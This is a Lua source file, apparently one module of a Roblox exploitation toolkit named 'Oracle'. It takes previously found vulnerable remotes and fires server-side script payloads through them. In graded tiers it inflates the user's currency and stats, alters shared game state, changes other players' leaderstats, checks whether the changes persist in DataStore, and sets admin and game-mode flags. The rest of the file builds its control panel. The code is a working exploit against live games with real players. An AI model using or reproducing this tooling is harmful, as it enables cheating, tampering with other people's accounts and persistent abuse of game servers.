-- Oracle // 37_impact.lua
-- IMPACT — Server-Side Capability Demonstrator
-- Takes every confirmed finding from all Oracle vectors and answers:
-- "What can this path actually DO server-side?"
-- Five graduated tiers: self → game state → cross-player → persistent → system
local G      = ...
local C      = G.C
local TI     = G.TI
local mk     = G.mk
local tw     = G.tw
local corner = G.corner
local stroke = G.stroke
local pad    = G.pad
local listV  = G.listV
local listH  = G.listH
local mkRow  = G.mkRow
local mkSep  = G.mkSep
local vs     = G.vs
local snap   = G.snap
local dif    = G.dif
local hookR  = G.hookR
local rlog   = G.rlog
local CFG    = G.CFG
local CON    = G.CON
local RepS   = G.RepS
local LP     = G.LP

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- IMPACT ENGINE
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")

-- Tier deltas — each distinct so they can't overlap or be confused
local T1_DELTA = 1111  -- self stat change
local T3_DELTA = 2222  -- other-player stat change

-- Tier weights
local TIER_WEIGHT = {1, 3, 5, 7, 10}

-- Impact categories
local CATEGORIES = {
    {min=0,  max=0,   label="NONE",          col=Color3.fromRGB(60,60,80)},
    {min=1,  max=3,   label="INFORMATIONAL", col=Color3.fromRGB(100,140,255)},
    {min=4,  max=8,   label="LOW",           col=Color3.fromRGB(80,200,140)},
    {min=9,  max=15,  label="MEDIUM",        col=Color3.fromRGB(255,200,60)},
    {min=16, max=22,  label="HIGH",          col=Color3.fromRGB(255,120,40)},
    {min=23, max=26,  label="CRITICAL",      col=Color3.fromRGB(255,40,40)},
}

local function getCategory(score)
    for _, cat in ipairs(CATEGORIES) do
        if score >= cat.min and score <= cat.max then return cat end
    end
    return CATEGORIES[1]
end

-- ── Stat snapshot helpers ──────────────────────────────────────────────────────
local function snapSelf()
    local s = {}
    local function cap(parent, prefix)
        if not parent then return end
        local ok, ch = pcall(function() return parent:GetChildren() end)
        if not ok then return end
        for _, v in ipairs(ch) do
            local ok2, val = pcall(function() return v.Value end)
            if ok2 and type(val) == "number" then
                s[prefix.."."..v.Name] = val
            end
        end
    end
    cap(LP:FindFirstChild("leaderstats"), "self.leaderstats")
    cap(LP, "self.player")
    return s
end

local function snapOtherPlayers()
    local s = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP then
            local ls = p:FindFirstChild("leaderstats")
            if ls then
                local ok, ch = pcall(function() return ls:GetChildren() end)
                if ok then
                    for _, v in ipairs(ch) do
                        local ok2, val = pcall(function() return v.Value end)
                        if ok2 and type(val) == "number" then
                            s[p.Name.."."..v.Name] = val
                        end
                    end
                end
            end
        end
    end
    return s
end

local function snapGameState()
    local s = {}
    local function capValues(root, prefix)
        local ok, ch = pcall(function() return root:GetDescendants() end)
        if not ok then return end
        for _, v in ipairs(ch) do
            -- Only non-player-owned values
            local inPlayers = false
            local p = v.Parent
            while p and p ~= game do
                if p == Players then inPlayers=true; break end
                p = p.Parent
            end
            if not inPlayers then
                local ok2, val = pcall(function() return v.Value end)
                if ok2 and type(val) ~= "nil" then
                    s[prefix.."."..v.Name] = tostring(val):sub(1,40)
                end
            end
        end
    end
    capValues(RepS,          "RS")
    capValues(game.Workspace,"WS")
    -- Lighting properties for T5
    pcall(function()
        s["Lighting.OutdoorAmbient"] = tostring(Lighting.OutdoorAmbient)
        s["Lighting.Brightness"]     = tostring(Lighting.Brightness)
        s["Lighting.ClockTime"]      = tostring(Lighting.ClockTime)
    end)
    return s
end

local function detectDelta(before, after, minDelta)
    local hits = {}
    for key, bval in pairs(before) do
        local aval = after[key]
        if aval ~= nil then
            local bnum = tonumber(bval) or (type(bval)=="number" and bval)
            local anum = tonumber(aval) or (type(aval)=="number" and aval)
            if bnum and anum and math.abs(anum-bnum) >= (minDelta or 1) then
                table.insert(hits, {
                    path   = key,
                    before = bval,
                    after  = aval,
                    delta  = anum-bnum,
                    exact  = minDelta and math.abs(anum-bnum)==minDelta,
                })
            elseif type(bval)=="string" and type(aval)=="string" and bval~=aval then
                table.insert(hits, {path=key, before=bval, after=aval, delta=0})
            end
        end
    end
    return hits
end

-- ── Tier scripts (for code-execution paths) ───────────────────────────────────
-- Each returns a Lua string that, when executed server-side, performs the tier action

local function tier1Script(playerName)
    return ([[
pcall(function()
    local p=game:GetService("Players")["%s"]
    if not p then return end
    local ls=p:FindFirstChild("leaderstats")
    if ls then
        for _,v in ipairs(ls:GetChildren()) do
            if v:IsA("NumberValue") or v:IsA("IntValue") then
                v.Value=v.Value+%d
            end
        end
    end
    for _,n in ipairs({"Coins","Cash","Points","XP","Score","Gems"}) do
        local sv=p:FindFirstChild(n)
        if sv and sv.Value~=nil then
            pcall(function() sv.Value=sv.Value+%d end)
        end
    end
end)
]]):format(playerName, T1_DELTA, T1_DELTA)
end

local function tier2Script()
    return [[
pcall(function()
    local rs=game:GetService("ReplicatedStorage")
    local ws=game.Workspace
    local changed=0
    for _,root in ipairs({rs,ws}) do
        local ok,d=pcall(function() return root:GetDescendants() end)
        if ok then for _,v in ipairs(d) do
            local inP=false
            local p=v.Parent
            while p do
                if p==game:GetService("Players") then inP=true;break end
                p=p.Parent
            end
            if not inP and changed<5 then
                if v:IsA("NumberValue") or v:IsA("IntValue") then
                    local ok2,_=pcall(function() v.Value=v.Value+1 end)
                    if ok2 then changed=changed+1 end
                elseif v:IsA("BoolValue") then
                    pcall(function() v.Value=not v.Value end)
                end
            end
        end end
    end
end)
]]
end

local function tier3Script()
    return ([[
pcall(function()
    local P=game:GetService("Players")
    for _,p in ipairs(P:GetPlayers()) do
        local ls=p:FindFirstChild("leaderstats")
        if ls then
            for _,v in ipairs(ls:GetChildren()) do
                if v:IsA("NumberValue") or v:IsA("IntValue") then
                    pcall(function() v.Value=v.Value+%d end)
                end
            end
        end
        for _,n in ipairs({"Coins","Cash","Points","XP","Score","Gems"}) do
            local sv=p:FindFirstChild(n)
            if sv and sv.Value~=nil then
                pcall(function() sv.Value=sv.Value+%d end)
            end
        end
    end
end)
]]):format(T3_DELTA, T3_DELTA)
end

local function tier5Script()
    return [[
pcall(function()
    -- Visual: shift ambient lighting (immediately visible, confirms system reach)
    local L=game:GetService("Lighting")
    local orig=L.OutdoorAmbient
    L.OutdoorAmbient=Color3.fromRGB(200,0,100)
    -- Admin flags
    local rs=game:GetService("ReplicatedStorage")
    local ws=game.Workspace
    for _,root in ipairs({rs,ws}) do
        for _,name in ipairs({"AdminMode","DebugMode","IsAdmin","GameOver","Overtime"}) do
            local v=root:FindFirstChild(name,true)
            if v then
                if v:IsA("BoolValue") then
                    pcall(function() v.Value=true end)
                elseif v:IsA("StringValue") then
                    pcall(function() v.Value="IMPACT_T5" end)
                end
            end
        end
    end
    -- Round/game state
    for _,name in ipairs({"GameState","RoundState","Phase","Status","Mode"}) do
        local v=rs:FindFirstChild(name,true) or ws:FindFirstChild(name,true)
        if v and v:IsA("StringValue") then
            pcall(function() v.Value="IMPACT_T5" end)
        end
    end
end)
]]
end

-- ── Fire a code-execution payload through a confirmed path ────────────────────
local function fireCodePath(finding, script)
    local remote = nil
    local remoteName = finding.remote or finding.mutRemote or finding.name or ""

    -- Find the remote instance
    local function findR(name)
        local function sc(root)
            local ok,d=pcall(function() return root:GetDescendants() end)
            if not ok then return nil end
            for _,x in ipairs(d) do
                if (x:IsA("RemoteEvent") or x:IsA("RemoteFunction"))
                and x.Name == name then return x end
            end
            return nil
        end
        return sc(RepS) or sc(game.Workspace)
    end
    remote = findR(remoteName)
    if not remote then return false end

    -- Use the payload format that was confirmed during detection
    local payloadTag = finding.payloadTag or finding.acceptedBy or finding.source or ""
    local payloads = {
        {args={script}},
        {args={{action="save",   script=script}}},
        {args={{action="exec",   code=script}}},
        {args={{action="run",    script=script}}},
        {args={{payload=script,  persist=true}}},
        {args={{message=script,  broadcast=true}}},
        {args={{action="broadcast", message=script}}},
        {args={{data=script}}},
    }

    local fired = false
    for _, p in ipairs(payloads) do
        task.wait(0.04)
        local ok = pcall(function()
            if remote:IsA("RemoteFunction") then
                remote:InvokeServer(table.unpack(p.args))
            else
                remote:FireServer(table.unpack(p.args))
            end
        end)
        if ok then fired=true end
    end
    return fired
end

-- ── Fire a mutation payload through a MODCACHE path ───────────────────────────
local function fireMutationPath(finding, key, value)
    local function findR(name)
        local function sc(root)
            local ok,d=pcall(function() return root:GetDescendants() end)
            if not ok then return nil end
            for _,x in ipairs(d) do
                if (x:IsA("RemoteEvent") or x:IsA("RemoteFunction"))
                and x.Name==name then return x end
            end
            return nil
        end
        return sc(RepS) or sc(game.Workspace)
    end
    local remote = findR(finding.mutRemote or finding.name or "")
    if not remote then return false end

    local payloads = {
        {args={key, value}},
        {args={{key=key, value=value}}},
        {args={{action="set", key=key, value=value}}},
        {args={{[key]=value}}},
        {args={{config={[key]=value}}}},
    }
    local fired = false
    for _, p in ipairs(payloads) do
        task.wait(0.03)
        local ok = pcall(function()
            if remote:IsA("RemoteFunction") then
                remote:InvokeServer(table.unpack(p.args))
            else
                remote:FireServer(table.unpack(p.args))
            end
        end)
        if ok then fired=true end
    end
    return fired
end

-- ── Fire a BindableFunction payload ──────────────────────────────────────────
local function fireBindPath(finding, payload)
    if not finding.instance and not finding.name then return false end
    local bf = finding.instance
    if not bf then
        -- Try to find it
        local function sc(root)
            local ok,d=pcall(function() return root:GetDescendants() end)
            if not ok then return nil end
            for _,x in ipairs(d) do
                if (x:IsA("BindableFunction") or x:IsA("BindableEvent"))
                and x.Name==finding.name then return x end
            end
            return nil
        end
        bf = sc(RepS) or sc(game.Workspace)
    end
    if not bf then return false end

    local ok = pcall(function()
        if bf:IsA("BindableFunction") then
            bf:Invoke(payload)
        else
            bf:Fire(payload)
        end
    end)
    return ok
end

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- TIER RUNNER — executes one tier against one finding
-- Returns: {pass, evidence, deltas}
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
local function runTier(tierNum, finding, logFn)
    local vtype = finding.vectorType

    -- ── T1: Self state mutation ────────────────────────────────────────────────
    if tierNum == 1 then
        local before = snapSelf()
        local fired  = false

        if vtype == "CODE_EXEC" then
            fired = fireCodePath(finding, tier1Script(LP.Name))
        elseif vtype == "MUTATION" then
            -- Try writing to player stat keys
            for _, key in ipairs({"coins","cash","score","xp","level","points"}) do
                if fireMutationPath(finding, key, 9999) then fired=true end
            end
        elseif vtype == "BINDABLE" then
            fired = fireBindPath(finding, {
                action="give", player=LP.Name, userId=LP.UserId,
                amount=1111, currency="coins",
            })
        elseif vtype == "TOGGLE" then
            -- Script toggle — just observe, no specific payload
            fired = true
        end

        task.wait(1.0)
        local after = snapSelf()
        local hits  = detectDelta(before, after, T1_DELTA)

        -- Also detect any stat change (not just exact delta)
        if #hits == 0 then
            hits = detectDelta(before, after, 1)
        end

        if logFn and #hits > 0 then
            for _, h in ipairs(hits) do
                logFn("FINDING",
                    ("T1 PASS: %s  %s -> %s  (delta %+d)"):format(
                        h.path, tostring(h.before), tostring(h.after), h.delta),
                    fired and "Code executed — self stat mutated" or
                    "Stat changed — indirect self mutation",
                    true)
            end
        end
        return {pass=#hits>0, evidence=hits, fired=fired}

    -- ── T2: Game state mutation ────────────────────────────────────────────────
    elseif tierNum == 2 then
        local before = snapGameState()
        local fired  = false

        if vtype == "CODE_EXEC" then
            fired = fireCodePath(finding, tier2Script())
        elseif vtype == "MUTATION" then
            for _, key in ipairs({"GameState","RoundTime","Score","Lives","Active"}) do
                if fireMutationPath(finding, key, "IMPACT") then fired=true end
                if fireMutationPath(finding, key, 99999)    then fired=true end
            end
        elseif vtype == "BINDABLE" then
            fired = fireBindPath(finding, {
                action="setGameState", state="IMPACT", score=99999,
            })
        end

        task.wait(1.0)
        local after = snapGameState()
        local hits  = detectDelta(before, after, 1)
        -- Filter out own-player changes
        local filtered = {}
        for _, h in ipairs(hits) do
            if not h.path:find("^self%.") then
                table.insert(filtered, h)
            end
        end

        if logFn and #filtered > 0 then
            for _, h in ipairs(filtered) do
                logFn("FINDING",
                    ("T2 PASS: %s  %s -> %s"):format(
                        h.path, tostring(h.before), tostring(h.after)),
                    "Game state mutated — path reaches beyond player scope",
                    true)
            end
        end
        return {pass=#filtered>0, evidence=filtered, fired=fired}

    -- ── T3: Cross-player effect ────────────────────────────────────────────────
    elseif tierNum == 3 then
        local othersBefore = snapOtherPlayers()
        if next(othersBefore) == nil then
            -- No other players in server
            if logFn then
                logFn("INFO","T3 SKIP: no other players in server",
                    "Solo session — cross-player tier not testable")
            end
            return {pass=false, evidence={}, skipped=true, reason="no other players"}
        end

        local fired = false
        if vtype == "CODE_EXEC" then
            fired = fireCodePath(finding, tier3Script())
        elseif vtype == "MUTATION" then
            -- Hard to do cross-player via mutation paths
            -- Best we can do: mutate a shared value and observe
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= LP then
                    if fireMutationPath(finding, "player_"..p.Name, T3_DELTA) then
                        fired=true
                    end
                end
            end
        elseif vtype == "BINDABLE" then
            fired = fireBindPath(finding, {
                action="giveAll", amount=T3_DELTA, currency="coins",
                allPlayers=true,
            })
        end

        task.wait(1.5)
        local othersAfter = snapOtherPlayers()
        local hits = detectDelta(othersBefore, othersAfter, 1)

        if logFn and #hits > 0 then
            for _, h in ipairs(hits) do
                logFn("FINDING",
                    ("T3 PASS: %s  %s -> %s  (delta %+d)"):format(
                        h.path, tostring(h.before), tostring(h.after), h.delta),
                    "OTHER PLAYER affected — single-player exploit confirmed multi-player",
                    true)
            end
        elseif logFn then
            logFn("INFO","T3: no other-player changes detected",
                "Either path is self-scoped or other players have no observable stats")
        end
        return {pass=#hits>0, evidence=hits, fired=fired}

    -- ── T4: Persistence ───────────────────────────────────────────────────────
    elseif tierNum == 4 then
        -- Persistence = does a T1-level change survive 30 seconds
        -- For DataStore-confirmed paths (DSCHAN) this is almost certain
        -- For others we check if the prior T1 stat change is still there
        local isDSCHAN = finding.vectorType == "CODE_EXEC" and
                         finding.source == "DSCHAN"

        local before30 = snapSelf()
        if isDSCHAN then
            -- DataStore by definition persists — no wait needed
            if logFn then
                logFn("FINDING",
                    "T4 PASS: DataStore-confirmed path — changes persist across sessions",
                    "DSCHAN vector writes to DataStore. Changes are permanent until corrected.",
                    true)
            end
            return {pass=true, evidence={}, isDSCHAN=true, fired=true}
        end

        -- For non-DS paths: check if T1 changes are still present after 30s
        if logFn then
            logFn("INFO","T4: waiting 30s to check persistence...")
        end
        task.wait(30)

        local after30 = snapSelf()
        local still   = detectDelta(before30, after30, 1)

        -- If ANY value from T1 is still changed (non-zero delta), it persisted
        if #still > 0 then
            if logFn then
                for _, h in ipairs(still) do
                    logFn("FINDING",
                        ("T4 PASS: %s still changed after 30s"):format(h.path),
                        ("Value %s persisted — not reset by server"):format(tostring(h.after)),
                        true)
                end
            end
            return {pass=true, evidence=still, fired=true}
        end

        if logFn then
            logFn("INFO","T4 FAIL: changes reverted within 30s",
                "Server reset the values — path does not produce persistent effects")
        end
        return {pass=false, evidence={}, fired=false}

    -- ── T5: System-level control ───────────────────────────────────────────────
    elseif tierNum == 5 then
        local gameStateBefore = snapGameState()
        local lightBefore     = tostring(Lighting.OutdoorAmbient)
        local fired           = false

        if vtype == "CODE_EXEC" then
            fired = fireCodePath(finding, tier5Script())
        elseif vtype == "MUTATION" then
            for _, key in ipairs({"admin","AdminMode","GameMode","Phase","Status"}) do
                if fireMutationPath(finding, key, true)      then fired=true end
                if fireMutationPath(finding, key, "IMPACT_T5") then fired=true end
            end
        elseif vtype == "BINDABLE" then
            fired = fireBindPath(finding, {
                action="setAdmin",   admin=true,
                action2="setMode",   mode="admin",
                action3="gameState", state="IMPACT_T5",
            })
        end

        task.wait(1.0)
        local lightAfter      = tostring(Lighting.OutdoorAmbient)
        local gameStateAfter  = snapGameState()

        local lightChanged    = lightAfter ~= lightBefore
        local stateHits       = detectDelta(gameStateBefore, gameStateAfter, 1)

        -- Filter for high-value hits (admin flags, game mode strings)
        local systemHits = {}
        if lightChanged then
            table.insert(systemHits, {
                path   = "Lighting.OutdoorAmbient",
                before = lightBefore,
                after  = lightAfter,
                system = true,
            })
        end
        for _, h in ipairs(stateHits) do
            local lp = h.path:lower()
            if lp:find("admin") or lp:find("mode") or lp:find("state") or
               lp:find("phase") or lp:find("status") or lp:find("round") or
               h.after == "IMPACT_T5" then
                h.system = true
                table.insert(systemHits, h)
            end
        end

        if logFn and #systemHits > 0 then
            for _, h in ipairs(systemHits) do
                logFn("FINDING",
                    ("T5 PASS: %s  %s -> %s"):format(
                        h.path, tostring(h.before), tostring(h.after)),
                    h.system and "SYSTEM-LEVEL CHANGE — path controls game engine state" or
                    "System state modified",
                    true)
            end
        elseif logFn then
            logFn("INFO","T5: no system-level changes detected",
                "Path does not appear to reach game mode/admin/lighting state")
        end
        return {pass=#systemHits>0, evidence=systemHits, fired=fired}
    end

    return {pass=false, evidence={}}
end

-- ── Finding harvester ─────────────────────────────────────────────────────────
-- Pulls confirmed findings from all G result tables and classifies them

local function harvestFindings()
    local findings = {}

    local function addFinding(f)
        if not f.vectorType or not f.label then return end
        table.insert(findings, f)
    end

    -- DSCHAN
    if G.DSCHAN_RESULTS then
        for _, r in ipairs(G.DSCHAN_RESULTS) do
            if r.canaryResult then
                addFinding({
                    vectorType  = "CODE_EXEC",
                    source      = "DSCHAN",
                    label       = "DataStore Channel",
                    remote      = r.name,
                    payloadTag  = "save_script",
                    confirmed   = r.canaryResult.confirmed,
                    delayMs     = r.canaryResult.delayMs,
                    col         = Color3.fromRGB(255,140,40),
                })
            end
        end
    end

    -- MSGBUS
    if G.MSGBUS_RESULTS then
        for _, r in ipairs(G.MSGBUS_RESULTS) do
            if r.execResult then
                addFinding({
                    vectorType  = "CODE_EXEC",
                    source      = "MSGBUS",
                    label       = "Messaging Bus",
                    remote      = r.name,
                    payloadTag  = "broadcast_msg",
                    confirmed   = r.execResult.confirmed,
                    execution   = r.execResult.execution,
                    col         = Color3.fromRGB(140,80,255),
                })
            end
        end
    end

    -- REQCANARY
    if G.REQCANARY_RESULTS then
        for _, r in ipairs(G.REQCANARY_RESULTS) do
            if r.canaryConfirmed then
                addFinding({
                    vectorType = "CODE_EXEC",
                    source     = "REQCANARY",
                    label      = "require(assetId)",
                    remote     = r.name,
                    confirmed  = true,
                    col        = Color3.fromRGB(255,90,150),
                })
            end
        end
    end

    -- MODCACHE
    if G.MODCACHE_RESULTS then
        for _, r in ipairs(G.MODCACHE_RESULTS) do
            addFinding({
                vectorType  = "MUTATION",
                source      = "MODCACHE",
                label       = "Module Cache",
                mutRemote   = r.mutRemote,
                name        = r.mutRemote,
                key         = r.key,
                value       = r.value,
                acceptedBy  = r.acceptedBy,
                confirmed   = r.confirmed,
                col         = Color3.fromRGB(80,210,180),
            })
        end
    end

    -- SCRIPTTOGGLE
    if G.ST_RESULTS then
        for _, r in ipairs(G.ST_RESULTS) do
            if r.score and r.score >= 4 then
                addFinding({
                    vectorType = "TOGGLE",
                    source     = "SCRIPTTOGGLE",
                    label      = "Script Toggle ("..r.surface..")",
                    remote     = r.remote,
                    script     = r.script,
                    surface    = r.surface,
                    score      = r.score,
                    confirmed  = r.score >= 8,
                    col        = Color3.fromRGB(255,160,40),
                })
            end
        end
    end

    -- BINDREACH
    if G.BINDREACH_RESULTS then
        for _, r in ipairs(G.BINDREACH_RESULTS) do
            local topScore = 0
            for _, pr in ipairs(r.results or {}) do
                if pr.score > topScore then topScore=pr.score end
            end
            if topScore >= 14 then
                addFinding({
                    vectorType = "BINDABLE",
                    source     = "BINDREACH",
                    label      = "BindableFunction",
                    name       = r.name,
                    path       = r.path,
                    class      = r.class,
                    score      = topScore,
                    confirmed  = true,
                    col        = Color3.fromRGB(100,200,255),
                })
            end
        end
    end

    -- GRANT confirmed paths (high-confidence remote paths)
    if G.GRANT_RESULTS then
        for _, r in ipairs(G.GRANT_RESULTS) do
            if r.bestPath and r.bestPath.score and r.bestPath.score >= 5 then
                addFinding({
                    vectorType = "CODE_EXEC",
                    source     = "GRANT",
                    label      = "Grant Path ("..r.category..")",
                    remote     = r.bestPath.remote,
                    payloadTag = r.bestPath.payloadTag,
                    confirmed  = true,
                    col        = Color3.fromRGB(80,210,100),
                })
            end
        end
    end

    -- AVD confirmed paths
    if G.AVD_FINDINGS then
        for _, f in ipairs(G.AVD_FINDINGS) do
            if f.vuln and (f.vuln.id=="UNAUTH_WRITE" or f.vuln.id=="NO_VALID") then
                addFinding({
                    vectorType = "CODE_EXEC",
                    source     = "AVD",
                    label      = "AVD: "..f.vuln.id,
                    remote     = f.remote,
                    confirmed  = true,
                    col        = Color3.fromRGB(255,60,60),
                })
            end
        end
    end

    return findings
end

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- IMPACT PAGE UI
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

local P_IMP = mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.fromScale(1,1),Visible=false,ZIndex=3},CON)

-- topbar
local TOPBAR=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,32),ZIndex=4},P_IMP)
stroke(C.BORDER,1,TOPBAR)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=5},TOPBAR)
mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
    Text="IMPACT — SERVER-SIDE CAPABILITY",
    TextColor3=Color3.fromRGB(255,40,40),TextSize=11,
    Size=UDim2.new(0,280,1,0),Position=UDim2.new(0,14,0,0),
    TextXAlignment=Enum.TextXAlignment.Left,ZIndex=5},TOPBAR)
local IMP_STATUS=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="idle — load findings to begin",TextColor3=C.MUTED,TextSize=9,
    Size=UDim2.new(1,-294,1,0),Position=UDim2.new(0,290,0,0),
    TextXAlignment=Enum.TextXAlignment.Right,ZIndex=5},TOPBAR)

-- control bar
local CTRLBAR=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,32),Size=UDim2.new(1,0,0,30),ZIndex=4},P_IMP)
stroke(C.BORDER,1,CTRLBAR)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=4},CTRLBAR)

local function mkBtn(txt,col,x)
    local b=mk("TextButton",{AutoButtonColor=false,
        BackgroundColor3=col,BorderSizePixel=0,
        Font=Enum.Font.GothamBold,Text=txt,
        TextColor3=Color3.fromRGB(8,8,12),TextSize=9,
        Size=UDim2.new(0,0,0,22),AutomaticSize=Enum.AutomaticSize.X,
        Position=UDim2.new(0,x,0.5,-11),ZIndex=5},CTRLBAR)
    corner(5,b)
    mk("UIPadding",{PaddingLeft=UDim.new(0,8),PaddingRight=UDim.new(0,8)},b)
    return b
end

local LOAD_BTN   = mkBtn("Load Findings",  Color3.fromRGB(80,140,255),  8)
local RUN_BTN    = mkBtn("Run All Tiers",  Color3.fromRGB(255,40,40),   138)
local STOP_BTN   = mkBtn("Stop",           Color3.fromRGB(60,15,15),    264)
STOP_BTN.TextColor3 = Color3.fromRGB(255,80,80)
stroke(Color3.fromRGB(255,80,80),1,STOP_BTN)

-- body
local BODY=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,62),Size=UDim2.new(1,0,1,-62),ZIndex=3},P_IMP)

-- left: findings list
local IL=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.new(0,240,1,0),ZIndex=3},BODY)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(0,1,1,0),Position=UDim2.new(1,-1,0,0),ZIndex=4},IL)
local LEFT_SCROLL=mk("ScrollingFrame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.fromScale(1,1),ScrollBarThickness=3,ScrollBarImageColor3=C.ACCDIM,
    CanvasSize=UDim2.fromScale(0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ZIndex=4},IL)
pad(6,8,LEFT_SCROLL); listV(LEFT_SCROLL,5)
local LEFT_EMPTY=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="Load Findings to harvest\nconfirmed paths from all\nOracle vector modules.",
    TextColor3=C.MUTED,TextSize=9,TextWrapped=true,
    Size=UDim2.new(1,0,0,50),TextXAlignment=Enum.TextXAlignment.Center,
    ZIndex=5,LayoutOrder=1},LEFT_SCROLL)

-- right: tier results + log
local IR=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,241,0,0),Size=UDim2.new(1,-241,1,0),ZIndex=3},BODY)

-- tier strip at top of right panel
local TIER_STRIP=mk("Frame",{BackgroundColor3=C.CARD,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,48),ZIndex=4},IR)
stroke(C.BORDER,1,TIER_STRIP)
listH(TIER_STRIP,4)

local TIER_NODES = {}
local TIER_LABELS = {"T1\nSelf","T2\nGame","T3\nOther","T4\nPersist","T5\nSystem"}
local TIER_COLS   = {
    Color3.fromRGB(80,140,255),
    Color3.fromRGB(80,200,140),
    Color3.fromRGB(255,200,60),
    Color3.fromRGB(255,120,40),
    Color3.fromRGB(255,40,40),
}
for i=1,5 do
    local cell=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
        Size=UDim2.new(0.2,0,1,0),ZIndex=5,LayoutOrder=i},TIER_STRIP)
    listV(cell,4)
    local dot=mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
        Size=UDim2.fromOffset(14,14),ZIndex=6,LayoutOrder=1},cell)
    corner(8,dot)
    local lbl=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
        Text=TIER_LABELS[i],TextColor3=C.MUTED,TextSize=8,TextWrapped=true,
        Size=UDim2.new(1,0,0,24),TextXAlignment=Enum.TextXAlignment.Center,
        ZIndex=6,LayoutOrder=2},cell)
    TIER_NODES[i] = {dot=dot, lbl=lbl, cell=cell}
end

-- score strip
local SCORE_ROW=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,48),Size=UDim2.new(1,0,0,26),ZIndex=4},IR)
stroke(C.BORDER,1,SCORE_ROW); listH(SCORE_ROW,8)
local SCORE_LBL=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
    Text="SCORE  0 / 26",TextColor3=C.MUTED,TextSize=11,
    Size=UDim2.new(0.4,0,1,0),TextXAlignment=Enum.TextXAlignment.Center,
    ZIndex=5,LayoutOrder=1},SCORE_ROW)
local CAT_LBL=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
    Text="NONE",TextColor3=C.MUTED,TextSize=11,
    Size=UDim2.new(0.6,0,1,0),TextXAlignment=Enum.TextXAlignment.Center,
    ZIndex=5,LayoutOrder=2},SCORE_ROW)

-- Progress bar
local PROG_BG=mk("Frame",{BackgroundColor3=C.CARD,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,74),Size=UDim2.new(1,0,0,3),ZIndex=5},IR)
local PROG_BAR=mk("Frame",{BackgroundColor3=Color3.fromRGB(255,40,40),
    BorderSizePixel=0,Size=UDim2.new(0,0,1,0),ZIndex=6},PROG_BG)
corner(2,PROG_BAR)

-- log
local LOG_SCROLL=mk("ScrollingFrame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,77),Size=UDim2.new(1,0,1,-77),
    ScrollBarThickness=4,ScrollBarImageColor3=C.ACCDIM,
    CanvasSize=UDim2.fromScale(0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,
    ScrollingDirection=Enum.ScrollingDirection.Y,ZIndex=4},IR)
pad(10,8,LOG_SCROLL); listV(LOG_SCROLL,3)
local LOG_EMPTY=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="IMPACT runs five graduated tiers\nagainst every confirmed finding.\n\n"..
         "Each tier that passes proves the\npath can perform that class of\nserver-side action.\n\n"..
         "Passing tier means: demonstrated,\nnot theoretical.",
    TextColor3=C.MUTED,TextSize=10,TextWrapped=true,
    Size=UDim2.new(1,0,0,130),TextXAlignment=Enum.TextXAlignment.Center,
    ZIndex=5,LayoutOrder=1},LOG_SCROLL)

-- log helpers
local iN=0
local function addLog(tag,msg,detail,hi)
    LOG_EMPTY.Visible=false; iN=iN+1; mkRow(tag,msg,detail,hi,LOG_SCROLL,iN)
    task.defer(function()
        LOG_SCROLL.CanvasPosition=Vector2.new(0,LOG_SCROLL.AbsoluteCanvasSize.Y)
    end)
end
local function addLogSep(txt) iN=iN+1; mkSep(txt,LOG_SCROLL,iN) end
local function clearLog()
    for _,c in ipairs(LOG_SCROLL:GetChildren()) do
        if not c:IsA("UIListLayout") and not c:IsA("UIPadding") then c:Destroy() end
    end
    iN=0; LOG_EMPTY.Visible=true
    tw(PROG_BAR,TI.fast,{Size=UDim2.new(0,0,1,0)})
end

